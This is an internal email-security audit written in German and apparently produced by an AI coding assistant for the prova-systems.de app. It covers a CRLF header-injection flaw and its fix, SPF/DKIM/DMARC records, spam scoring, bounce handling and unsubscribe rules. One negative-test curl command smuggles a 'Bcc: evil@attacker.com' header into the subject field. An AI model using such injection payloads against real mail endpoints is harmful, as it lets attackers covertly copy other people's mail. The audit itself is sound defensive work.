# Audit 14 — Email-Sicherheit

**Datum:** 03.05.2026 (Sprint S6 Phase 4)
**Auditor:** Claude Code
**Methodik:** Code-Review `smtp-senden.js` + DNS-Empfehlungen (Marcel verifiziert live)

---

## Findings-Übersicht

| Severity | Anzahl | Bereich |
|---|---:|---|
| HIGH | 2 | CRITICAL CRLF-Injection, Empfänger-Format-Check |
| MEDIUM | 2 | SPF/DKIM/DMARC, mail-tester Score |
| LOW | 1 | Bounce-Handling |
| NEEDS-MARCEL | 2 | DNS-Verify, Unsubscribe-Link |

---

## HIGH-1 — `smtp-senden.js` CRLF-Injection

→ Detail in `docs/audit/2026-05-02-input-validation.md` IV-02. Bereits in BACKLOG (H-20).

**Quick-Fix:**
```js
if (subject.includes('\r') || subject.includes('\n') ||
    to.includes('\r') || to.includes('\n')) {
  return json(400, { error: 'CRLF in Header verboten' });
}
```

---

## HIGH-2 — Empfänger-Format-Check fehlt (Audit 5 IV-02)

→ Bereits in BACKLOG (H-20).

---

## MEDIUM-1 — SPF / DKIM / DMARC für prova-systems.de

**Status:** Marcel-Verifikation pflicht (kann ich nicht aus Sandbox prüfen).

**DNS-Records die existieren müssen:**
```
SPF (TXT @ prova-systems.de):
  v=spf1 include:_spf.ionos.com include:amazonses.com ~all
  (oder analog je nach SMTP-Anbieter)

DKIM (TXT s1._domainkey.prova-systems.de):
  v=DKIM1; k=rsa; p=MIIBIjAN...
  (Public-Key vom SMTP-Anbieter erhalten)

DMARC (TXT _dmarc.prova-systems.de):
  v=DMARC1; p=quarantine; rua=mailto:dmarc-reports@prova-systems.de; pct=100
```

**Verifikation (Marcel manuell):**
```bash
dig +short TXT prova-systems.de | grep spf
dig +short TXT s1._domainkey.prova-systems.de
dig +short TXT _dmarc.prova-systems.de

# Online: https://mxtoolbox.com/spf.aspx
# Online: https://www.mail-tester.com (Test-Mail senden)
```

**Severity:** MEDIUM
**Status:** NEEDS-MARCEL

---

## MEDIUM-2 — mail-tester.com Spam-Score

**Marcel-Aktion:**
1. Test-Mail an `test-XXXX@mail-tester.com` (ID auf der Website)
2. Score abfragen
3. Erwartung: ≥ 8/10

**Häufige Spam-Signale:**
- HTML-only ohne text-fallback
- Keine `List-Unsubscribe`-Header
- Hohe Image-zu-Text-Ratio
- Verdächtige Subject-Lines

---

## LOW-1 — Bounce-Handling

**Aktuell:** PROVA hat keinen Bounce-Handler. Bei harten Bounces (Adresse existiert nicht) wird Mail einfach verloren — kein User-Feedback.

**Empfehlung:**
- IONOS-SMTP-Bounce-Reports an `bounce@prova-systems.de`
- Edge-Function `smtp-bounce-handler` parsed Bounces, marked User-Email als invalid in `users.email_verified=false`

**Severity:** LOW
**Status:** BACKLOG (Folge-Sprint nach erstem Pilot-Pain)

---

## NEEDS-MARCEL: Unsubscribe-Link

**Problem:** PROVA versendet aktuell nur transaktionale E-Mails (Trial-Reminder, Founding-Mail). Diese sind **nicht** Marketing-Emails (CAN-SPAM-konform — kein Unsubscribe-Pflicht).

**Aber:** wenn Newsletter dazu kommt → Unsubscribe pflicht (Art. 7 UWG, §7 UWG für Werbung).

**Empfehlung:** vor Newsletter-Launch:
- `List-Unsubscribe`-Header in Mail-Footer
- One-Click-Unsubscribe-Endpoint (`/unsubscribe?token=...`)
- DSGVO Art. 21 Widerrufs-Mechanismus

**Severity:** NEEDS-MARCEL (relevant wenn Newsletter geplant)

---

## Header-Injection-Test (Negativ-Test)

```bash
# Marcel kann das gegen Test-Endpoint laufen lassen:
curl -X POST https://app.prova-systems.de/.netlify/functions/smtp-senden \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "to": "victim@example.de",
    "subject": "Test\r\nBcc: evil@attacker.com",
    "text": "Hello"
  }'
# Erwartet nach IV-02-Fix: 400 "CRLF in Header verboten"
# Aktuell: 200 + Mail wird mit injektierter Bcc-Header versendet (HIGH-Vuln)
```

---

## Findings → BACKLOG

| ID | Severity | Titel | Action |
|---|---|---|---|
| EM-01 | HIGH | CRLF-Injection-Schutz | siehe H-20 (Sprint X4) |
| EM-02 | HIGH | Empfänger-Format-Check | siehe H-20 |
| EM-03 | MED | SPF/DKIM/DMARC Verifikation | NEEDS-MARCEL DNS |
| EM-04 | MED | mail-tester.com Score | NEEDS-MARCEL |
| EM-05 | LOW | Bounce-Handler | Folge-Sprint |
| EM-06 | NM | Unsubscribe-Link wenn Newsletter | Folge-Sprint |

---

*Audit 14 abgeschlossen 03.05.2026*
